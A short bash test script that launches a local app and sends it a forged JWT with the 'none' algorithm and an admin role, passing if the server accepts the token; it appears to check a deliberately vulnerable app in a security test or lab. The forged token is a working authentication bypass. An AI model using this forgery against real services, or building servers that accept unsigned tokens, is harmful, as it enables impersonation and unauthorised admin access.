#!/bin/bash
set -e
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PORT=8086

python3 "$SCRIPT_DIR/app.py" $PORT &
SERVER_PID=$!
sleep 1

HEADER_B64=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=')
PAYLOAD_B64=$(echo -n '{"sub":"admin","role":"admin","iat":1700000000}' | base64 | tr -d '=')
TOKEN="${HEADER_B64}.${PAYLOAD_B64}."

RESPONSE=$(curl -s -H "Authorization: Bearer $TOKEN" "http://localhost:$PORT/")
if echo "$RESPONSE" | grep -q '"authenticated": true'; then
    if echo "$RESPONSE" | grep -q '"alg": "none"'; then
        echo "POSITIVE TEST PASSED: JWT with alg=none accepted as authenticated"
        kill $SERVER_PID 2>/dev/null
        exit 0
    fi
fi
echo "POSITIVE TEST FAILED: JWT none algorithm not accepted"
echo "Response: $RESPONSE"
kill $SERVER_PID 2>/dev/null
exit 1